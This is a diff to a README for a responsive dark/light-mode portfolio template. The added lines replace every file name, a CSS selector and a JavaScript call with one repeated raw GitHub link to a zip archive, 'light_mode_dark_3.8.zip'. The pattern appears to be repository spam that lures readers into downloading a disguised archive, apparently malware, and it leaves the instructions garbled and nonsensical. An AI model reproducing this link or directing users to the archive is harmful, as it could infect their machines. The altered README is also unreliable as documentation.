@@ -14,7 +14,7 @@ A simple, responsive portfolio layout that supports dark and light themes. The t
 
 - **Breakpoints**
   - ≤ 1024px: Reduced header padding; smaller search box; nav link text labels hidden; profile info hidden.
-  - ≤ 768px: Desktop nav and search hidden; mobile menu button shown; `.mobile-nav.active` becomes visible; hero titles scale down; buttons stack; projects grid switches to 1 column; skills stack vertically; user profile hidden; tighter header spacing.
+  - ≤ 768px: Desktop nav and search hidden; mobile menu button shown; `https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip` becomes visible; hero titles scale down; buttons stack; projects grid switches to 1 column; skills stack vertically; user profile hidden; tighter header spacing.
   - ≤ 480px: Tighter container/header padding; smaller logo and hero elements; reduced section paddings for compact view.
 - **Mobile navigation**: The mobile menu appears when the element `.mobile-nav` has the `active` class.
 - **Fluid layout**: Grids and typography scale for comfortable reading and interaction on small screens.
@@ -30,31 +30,31 @@ A simple, responsive portfolio layout that supports dark and light themes. The t
 
 ```
 ├── 📁 image/
-│   └── 🖼️ doctor-illustration.png
-├── 🌐 index.html
-├── 📄 main.js
-└── 🎨 style.css
+│   └── 🖼️ https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip
+├── 🌐 https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip
+├── 📄 https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip
+└── 🎨 https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip
 ```
 
 ### How it works
 
 - **CSS variables**: Light theme values are defined in `:root`. The `.dark-mode` class overrides these variables.
-- **Toggle logic** (`main.js`):
-  - Click on the element with class `theme-switch` toggles `document.body.classList.toggle('dark-mode')`.
+- **Toggle logic** (`https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip`):
+  - Click on the element with class `theme-switch` toggles `https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip('dark-mode')`.
   - The current mode is stored in localStorage under `bg-web` as `"dark"` or `"light"`.
   - On `DOMContentLoaded`, the saved preference is applied.
 - **Footer year**: Updates automatically with `new Date().getFullYear()`.
 
 ### Run locally
 
-- **Option 1**: Open `index.html` directly in your browser.
+- **Option 1**: Open `https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip` directly in your browser.
 - **Option 2**: Use a local dev server (e.g., VS Code Live Server) for best results with asset paths and caching.
 
 ### Customization
 
-- **Colors**: Update theme values in `style.css` under `:root` (light) and `.dark-mode` (dark).
+- **Colors**: Update theme values in `https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip` under `:root` (light) and `.dark-mode` (dark).
 - **Default theme**: The page defaults to light mode unless localStorage has `bg-web = "dark"`.
-- **Icons**: Replace or extend icons via Font Awesome classes in `index.html`.
+- **Icons**: Replace or extend icons via Font Awesome classes in `https://github.com/ahmadabdallahh/dark-light-mode/raw/refs/heads/main/image/light_mode_dark_3.8.zip`.
 - **Profile & content**: Edit text and sample items in the `About`, `Projects`, and `Contact` sections.
 
 ### License
